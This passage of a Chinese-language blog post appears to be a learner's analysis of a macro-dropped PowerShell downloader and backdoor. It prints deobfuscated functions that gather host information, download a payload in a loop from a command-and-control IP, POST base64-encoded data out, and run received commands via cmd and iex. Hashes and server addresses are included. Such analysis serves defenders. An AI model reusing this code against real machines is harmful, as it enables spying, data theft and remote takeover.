class="number">2</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">0</span>) 获取%SystemRoot%</span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">1</span>)获取<span class="string">"%SystemRoot%\System32环境便量路径</span></span><br><span class="line"><span class="string">Case 4</span></span><br><span class="line"><span class="string">d3r = f.getspecialfolder(2)获取%Temp%环境便量路径</span></span><br><span class="line"><span class="string">Case Else</span></span><br><span class="line"><span class="string">d3r = ""</span></span><br><span class="line"><span class="string">End Select</span></span><br><span class="line"><span class="string">End Function</span></span><br></pre></td></tr></table></figure><p>去除混淆</p><p><code>FiSA()</code>每次都返回”scriPtInG.filesystemObJEct”.流式文本对象.</p><p><code>getspecialfolder(id)</code>是vbs自带的函数,根据参数的不同获得的值也不一样,0=WindowsFolder,1=SystemFolder,2=TemporaryFolder.</p><h4 id="FuN-id"><a href="#FuN-id" class="headerlink" title="FuN(id)"></a>FuN(id)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> FuN(id)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">FuN = <span class="string">"\aaaaa.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">FuN = <span class="string">"\aulngr.vbe"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">FuN = <span class="string">"\bbbbbb.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">FuN = <span class="string">"\report.xls"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">4</span></span><br><span class="line">FuN = <span class="string">"\report.docx"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">FuN = <span class="string">""</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>宏代码 功能总结</p><p>释放<strong>VBE Loader**</strong>于%temp%\aulmgr.vbe下,并且注册表修改为开机自启动.</p><h3 id="aulngr-vbe-分析"><a href="#aulngr-vbe-分析" class="headerlink" title="aulngr.vbe 分析"></a>aulngr.vbe 分析</h3><p><img src="https://i.loli.net/2019/10/01/YfGXswl4WAt3PJx.png" alt="image.png"></p><table><thead><tr><th>md5</th><th>9d2da5228e21594ab46b4f5281d38b8f</th></tr></thead><tbody><tr><td>sha1</td><td>2b548816eeacd4fd4dee30f46acaecb34b1238e3</td></tr></tbody></table><p>文本看不太懂,根据师傅的报告进行恢复.解除编码后大概这个样子</p><p><img src="https://i.loli.net/2019/10/01/lmN4Lg3Vtb67aj8.png" alt="image.png"></p><p>中间混淆了一大堆看不太懂的的东西,只能看师傅的学习分析.</p><p>去除掉大多数的杂鱼信息,关键字集中在shell</p><p><img src="https://i.loli.net/2019/10/01/fPIcY76Jm9MKVgB.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/01/qgUpVZ29GdFXS4T.png" alt="image.png"></p><p>取b的值存储到<code>%public%\UserImage.png</code>中,再使用powershell运行它.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/w: -w is short <span class="keyword">for</span> -WindowStyle</span><br><span class="line">Normal (<span class="number">0</span>)</span><br><span class="line">Maximized (<span class="number">3</span>)</span><br><span class="line">Minimized (<span class="number">2</span>)</span><br><span class="line">Hidden (<span class="number">1</span>)</span><br><span class="line">gc: <span class="built_in">Get-Content</span> 获取内容</span><br><span class="line">iex: <span class="built_in">Invoke-Expression</span>  调用表达式</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/55775202/what-is-w-1-and-c-in-powershell-command" target="_blank" rel="noopener">参考</a></p><p>然后分析下b的字符串.将base64编码后的字符串存入vv,然后赋予到er变量.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(<span class="variable">$vv</span>));&amp; (gcm i*v*p*s*n) <span class="variable">$er</span></span><br></pre></td></tr></table></figure><p>然后运行后面的表达式.那<code>gcm i*v*p*s*n</code>是什么呢,powershell跑一下就行了,唯一匹配iex,也就是调用它.<code>$er</code>的意思就是base64解码后按照unicode解析字符串.</p><p>运行一下得到powershell代码的UserImage.png.</p><h3 id="UserImage-png"><a href="#UserImage-png" class="headerlink" title="UserImage.png"></a>UserImage.png</h3><p>C:\Users\Public\UserImage.png(%public%\UserImage.png)</p><table><thead><tr><th>md5</th><th>34a072f42905f9de31523616e8f207b1</th></tr></thead><tbody><tr><td>SHA1</td><td>3d37affb081e7c9586bdac2fe9e45368f812ceb4</td></tr></tbody></table><p>解码其中的base64编码后的powershell代码.使用<a href="http://prettyprinter.de/" target="_blank" rel="noopener">http://prettyprinter.de</a>略微格式化一下.然后ise中调试.</p><h4 id="powershell函数分析"><a href="#powershell函数分析" class="headerlink" title="powershell函数分析"></a>powershell函数分析</h4><h5 id="lTXxzy53"><a href="#lTXxzy53" class="headerlink" title="lTXxzy53()"></a>lTXxzy53()</h5><p><img src="https://i.loli.net/2019/10/01/cFQ8ZgYNJMmoaud.png" alt="image.png">所有函数都如上面一样加密过,动态调试运行<code>i98mG9I84cHnev2ywJGZ</code>解密就行.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> lTXxzy53()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;<span class="variable">$whj95r69Xal</span> = <span class="variable">$ENV:USERNAME</span>;&#125;</span><br><span class="line">       <span class="keyword">catch</span>&#123;<span class="variable">$whj95R69xAl</span> = (<span class="string">'Error Username'</span>);&#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$whJ95r69xAl</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>获得环境变量下的用户名称.</p><h5 id="NIQCw20"><a href="#NIQCw20" class="headerlink" title="NIQCw20"></a>NIQCw20</h5><p>不太懂</p><h5 id="EdA4VNZrBAU37Pd7ND"><a href="#EdA4VNZrBAU37Pd7ND" class="headerlink" title="EdA4VNZrBAU37Pd7ND()"></a>EdA4VNZrBAU37Pd7ND()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> EdA4VNZrBAU37Pd7ND()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$BtvwpfSFUmi_</span> = <span class="variable">$Env:eDA4VNZrBAU37pD7Nd</span>;&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;<span class="variable">$btvwpfSfumI_</span> = (<span class="string">'Error UserDomain'</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$BTvwpfSFumI_</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据下面的提示应该是用户域的名称 <code>%userdomain%</code></p><h5 id="UTFhxPjChlXs1OxREdR"><a href="#UTFhxPjChlXs1OxREdR" class="headerlink" title="UTFhxPjChlXs1OxREdR()"></a>UTFhxPjChlXs1OxREdR()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> UTFhxPjChlXs1OxREdR()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$a3rm5By20VTEfgF04</span> = ls <span class="variable">$enV:USERPROFILE</span>\Desktop;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$A3rm5BY20vteFgF04</span> =<span class="string">"Error ls"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$A3rm5bY20vtEFGF04</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ls遍历桌面文件,错误反汇Errot ls.</p><h5 id="zokOsMYYZQG1GyNMGDZ"><a href="#zokOsMYYZQG1GyNMGDZ" class="headerlink" title="zokOsMYYZQG1GyNMGDZ()"></a>zokOsMYYZQG1GyNMGDZ()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> zokOsMYYZQG1GyNMGDZ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$zhXA59XV3lDJhu</span> = ps;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$ZHXA59xV3LDjHU</span> = <span class="string">"Error TaskList"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$zHxA59xv3lDjHu</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行指令<code>ps</code>,获得进程列表,错误返回”Error TaskList”.</p><h5 id="sp169N5"><a href="#sp169N5" class="headerlink" title="sp169N5()"></a>sp169N5()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> sp169N5()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$iYwj2qTWWlSlvnB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line">        <span class="variable">$iYwj2QTWwlSLVNb</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$iYWj2QtWwLSLvnB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$LaYS5yC59zA8PFhrFm9TP</span>=<span class="variable">$Iywj2qtwwlsLVNB</span>.DownloadString(<span class="string">"http://ip-api.com/json"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$LAYS5yC59zA8PFhRfM9Tp</span> = <span class="string">"Error Remote IP"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59za8PFhrFM9TP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<a href="http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error" target="_blank" rel="noopener">http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error</a> Remote IP`返回如下:<img src="https://i.loli.net/2019/10/01/ovf9WC7StRUhTix.png" alt="image.png"></p><h5 id="dYUUIGUfLNIoN"><a href="#dYUUIGUfLNIoN" class="headerlink" title="dYUUIGUfLNIoN()"></a>dYUUIGUfLNIoN()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> dYUUIGUfLNIoN()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$htVH9OtOCbnP7Oa</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$HtvH9OtocBNp7OA</span> = <span class="string">"error os Arch"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$htVH9otOCbnp7OA</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统信息,错误返回”error os Arch”</p><p><img src="https://i.loli.net/2019/10/01/kJ7VhFmIZYNH1ln.png" alt="image.png"></p><h5 id="L82O-u0EwZy（）"><a href="#L82O-u0EwZy（）" class="headerlink" title="L82O_u0EwZy（）"></a>L82O_u0EwZy（）</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> L82O_u0EwZy()</span><br><span class="line">    &#123;</span><br><span class="line">        lTXXzy53;</span><br><span class="line">        Eda4vnZRBaU37pd7ND;</span><br><span class="line">        zoKoSMyYZqg1gYNmGDZ;</span><br><span class="line">        uTFHxpJCHlXs1OXrEdR;</span><br><span class="line">        SP169n5;</span><br><span class="line">        DyuUigUFlnioN;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行上述函数.</p><h5 id="finally部分函数"><a href="#finally部分函数" class="headerlink" title="finally部分函数"></a>finally部分函数</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L82o_u0eWZY | <span class="built_in">out-file</span> <span class="variable">$ENV:temp</span>\log.txt;</span><br><span class="line"><span class="variable">$iYwj2qTwWLslvNB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line"><span class="variable">$IYWj2QtwWLSLVNB</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line"><span class="variable">$iYwj2QTWWLSlVNB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line"><span class="variable">$m2g9a1mNOtasOaLofMKD</span> = <span class="variable">$EnV:temp</span> +<span class="string">'\log.txt'</span>;</span><br><span class="line"><span class="variable">$QBrjTZAqQWJDJ</span> = <span class="string">"http://185.185.25.175/sDownloads/"</span>;</span><br></pre></td></tr></table></figure><p>运行<code>L82o_u0eWZY</code>,将系统心思保存到<code>%temp%\log.txt</code>中,调试得出<code>$m2g9a1mNOtasOaLofMKD</code>是<code>%temp%\log.txt</code></p><h5 id="K9Dpje9u4bcbqu351w"><a href="#K9Dpje9u4bcbqu351w" class="headerlink" title="K9Dpje9u4bcbqu351w()"></a>K9Dpje9u4bcbqu351w()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> K9Dpje9u4bcbqu351w()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>((-<span class="number">1</span> + <span class="number">2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        niqCW20((<span class="number">1</span> + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">start-sleep</span> -s ([int](([int](<span class="number">54</span> / <span class="number">3</span>)) / <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;               <span class="variable">$IyWj2QTWwLSLVnb</span>.DownloadFile(<span class="string">"http://185.185.25.175/sDownloads/"</span>+ <span class="variable">$RLZNAuZxC9UqzY</span> + <span class="string">'.jpeg'</span>,<span class="variable">$ENV:public</span> +<span class="string">"\"</span>+ <span class="string">"ieee"</span> + <span class="string">".dat"</span>);</span><br><span class="line">            CHr0OkIxe0xiupYa;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_</span>.Exception.Message)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$RLZNAuZxC9UqzY</code>这个值等于GUID,<img src="https://i.loli.net/2019/10/02/RDgfKCjoh7FGUqB.png" alt="image.png"></p><p><code>while(1)</code>死循环直到从”<a href="http://185.185.25.175/sDownloads/&quot;+" target="_blank" rel="noopener">http://185.185.25.175/sDownloads/&quot;+</a> guid+ ‘.jpeg’,然后保存为 <code>%Public%ieee.dat</code></p><p>bl4ReiVGQkuTog($nt8brxx)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Lbl4ReiVGQkuTog(<span class="variable">$nt8brxx</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;     <span class="variable">$LaYS5yC59za8PFHRfm9Tp</span>=<span class="variable">$iywj2qtWwLSLvNB</span>.DownloadString(<span class="variable">$Nt8BrxX</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$Lq66fcth</span> = <span class="variable">$_</span>.Exception.Message;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59zA8PFhrFm9tP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$iywj2qtWwLSLvNB</code>是一个<code>WebClient</code>对象,存储了相关信息进行下载.</p><h5 id="fwlKy5wjJIz6CGCbzI-上传功能函数"><a href="#fwlKy5wjJIz6CGCbzI-上传功能函数" class="headerlink" title="fwlKy5wjJIz6CGCbzI() 上传功能函数"></a>fwlKy5wjJIz6CGCbzI() 上传功能函数</h5><p><img src="https://i.loli.net/2019/10/02/jqATBFtdcHDkI8i.png" alt="image.png"></p><p>死循环无限执行.</p><ol><li>gc功能提取<code>%temp%\log.txt</code>内容</li><li>转换为字符串</li><li>返回一个<code>utf-8</code>字符对象</li><li>base64转码</li><li>返回一个<code>utf-8</code>字符对象</li><li>以post方式上传数据</li></ol><p><img src="https://i.loli.net/2019/10/02/euh924LDNOybrXF.png" alt="image.png"></p><p>base64数据传输</p><p><img src="https://i.loli.net/2019/10/02/pX6JFcCebHuMEhI.png" alt="image.png"><img src="https://i.loli.net/2019/10/02/pC64S9NomiXjFcr.png" alt="image.png"></p><p>数据解析.</p><p>到此这个powershell下载上传器大概功能总结完了,简单概括来说就是一个上传电脑信息,下载后门的脚本文件.</p><h3 id="backdoor-powershell-ieee-dat"><a href="#backdoor-powershell-ieee-dat" class="headerlink" title="backdoor powershell ieee.dat"></a>backdoor powershell ieee.dat</h3><p><code>%public%\ieee.dat%</code></p><p>因为服务器已经关闭了,只能跟着师傅md5找样本了.</p><p>从<a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com</a>找到相关样本信息.</p><h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><p><img src="https://i.loli.net/2019/10/06/ofkVKibWSslyu12.png" alt="image.png"></p><ol><li>变量u存放的是base64编码后的powershell代码</li><li><code>Encoding]::Unicode.GetString([System.Convert]::FromBase64String($u))</code>解码</li><li><code>gcm i*v*p*s*n</code>匹配<code>Invoke-Expression</code>执行内存中的powershell命令.</li></ol><h4 id="0x02-powershell-后门解析"><a href="#0x02-powershell-后门解析" class="headerlink" title="0x02 powershell 后门解析"></a>0x02 powershell 后门解析</h4><p>文件的代码太多了,现在还是根据看起来像是字符串的地方入手</p><h5 id="wltJBgnP"><a href="#wltJBgnP" class="headerlink" title="wltJBgnP()"></a>wltJBgnP()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> wltJBgnP()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$thaTh2FrqCarDJH_</span> = <span class="variable">$eNV:username</span>;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$thATH2fRqCarDJh_</span> = <span class="string">"Username Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ThATh2fRqCarDJH_</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取用户名,失败返回<code>&quot;Username Error&quot;</code></p><p>VDf4TkTOMy3p_Br8UL5nH()</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VDf4TkTOMy3p_Br8UL5nH()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$tSppY_CTU6rBZN_</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;<span class="variable">$tSppY_CTU6rBzN_</span> = <span class="variable">$tsppy_CTu6RBZN_</span>.replace(<span class="string">":"</span>,<span class="string">";"</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$TsPPy_cTu6rbZN_</span> = <span class="string">"os Name Error"</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tSPpy_cTu6rbZN_</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统名称将<code>:</code>替换成<code></code>;`失败返回”os Name Error”</p><h5 id="MUHr7u0hahhrAxQ"><a href="#MUHr7u0hahhrAxQ" class="headerlink" title="MUHr7u0hahhrAxQ"></a>MUHr7u0hahhrAxQ</h5><p>接受指令,运行屏幕截图操作,并且以post方式发送base64编码后的png数据,发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=sc&amp;i={GUID}.png</code></p><p>将获取到的cmd命令用<strong>cmd /c</strong>执行,并且将返回的结果数据,经过<code>base64</code>编码,将编码后的数据以<code>Post</code>的方式发送到如下地址<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}</code></p><p>如果<code>stratwith</code>函数既没有匹配到<strong>“cmd”</strong>以及<strong>“screenshot”</strong>字符串,则将其用<code>iex</code>命令执行,如果执行成功,就将执行后的返回结果,通过<code>base64</code>编码后,将编码数据以<code>Post</code>方式发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}地址</code></p><h5 id="d-1SmifuaaJWTHfuQgh"><a href="#d-1SmifuaaJWTHfuQgh" class="headerlink" title="d_1SmifuaaJWTHfuQgh()"></a>d_1SmifuaaJWTHfuQgh()</h5><p><img src="https://i.loli.net/2019/10/07/HuaI5mAXDM7gOiP.png" alt="image.png">创建webclient对象,模拟代理,下载回显</p><h5 id="n-n9tyYOaI9m6lB"><a href="#n-n9tyYOaI9m6lB" class="headerlink" title="n_n9tyYOaI9m6lB()"></a>n_n9tyYOaI9m6lB()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> n_n9tyYOaI9m6lB(<span class="variable">$XSOhPvlsxIYbHLA8bYyj</span>,<span class="variable">$kc5aUnEOK7xCY7Usl1s</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t45lYeJN</span> = <span class="variable">$kC5auneOk7Xcy7usl1S</span>;</span><br><span class="line">        <span class="variable">$s6d70IV</span> = [System.Net.WebRequest]::Create(<span class="variable">$xsOHpVLsxIybHLa8bYyj</span>);</span><br><span class="line">        <span class="variable">$s6d70iV</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$s6d70Iv</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$wOGrHtrYusWGef</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class="variable">$T45lyeJN</span>);</span><br><span class="line">        <span class="variable">$s6D70iv</span>.Method = <span class="string">"POST"</span>;</span><br><span class="line">        <span class="variable">$s6D70IV</span>.ContentLength = <span class="variable">$wogrHTrYuSwGef</span>.length;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$wogRHtRYuswGEf</span>.Length <span class="nomarkup">-gt</span> <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$QOUGx1Qkwlah9W</span> = <span class="variable">$s6d70iv</span>.GetRequestStream();</span><br><span class="line">            <span class="variable">$qoUgx1Qkwlah9W</span>.Write(<span class="variable">$wOgRHTRyuswGEF</span>, (<span class="number">1</span> - <span class="number">1</span>), <span class="variable">$wogrhtryuswgef</span>.Length);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        [System.Net.WebResponse] <span class="variable">$rAtaxJplMEbTuO8yApqOg</span> = <span class="variable">$S6D70Iv</span>.GetResponse();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rAtAXjpLMeBTuo8Yapqog</span> <span class="nomarkup">-ne</span> <span class="literal">$NUlL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$EgAFhyjSEtNkIMP714inO</span> = <span class="variable">$RatAXjPLMEbtuO8yAPQOg</span>.GetResponseStream();</span><br><span class="line">            [System.IO.StreamReader] <span class="variable">$Cx3Ig4SFBZ75udmdkzK2</span> = <span class="built_in">New-Object</span> System.IO.StreamReader <span class="variable">$EGAfhyjSeTNkIMP714ino</span>;</span><br><span class="line">            [String] <span class="variable">$FsVCEsC5h</span> = <span class="variable">$cx3IG4SfbZ75uDmdkZk2</span>.ReadToEnd();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fsVcESC5h</span> = (<span class="string">"httpPOST"</span> + <span class="variable">$_</span>.Exception.Message);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$FsVceSC5H</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第一个参数是请求的地址,第二个参数是请求的内容</li><li><code>[System.Net.WebRequest]::Create</code>传入第一个参数初始化<code>WebRequest</code>实例</li><li>获取本地ie代理,并设置为默认证书</li><li>采用utf-8编码数据</li><li>使用<code>POST</code>发送</li><li>如果长度大于0,发送<code>GetRequestStream().Write()</code>请求山上,然后<code>.GetResponse()</code>接收数据</li><li>如果回显非空,<code>.GetResponseStream()</code>读入数据流,全部读取.</li></ol><h5 id="Aj9VVbP5C"><a href="#Aj9VVbP5C" class="headerlink" title="Aj9VVbP5C()"></a>Aj9VVbP5C()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Aj9VVbP5C()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$Uy7hTSuBKQe33iYx5F74</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$uy7hTsubkQE33Iyx5f74</span> = <span class="string">"Architecture Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$UY7HTSuBkQE33iYX5f74</span>;</span><br><span class="line">    </span><br><span 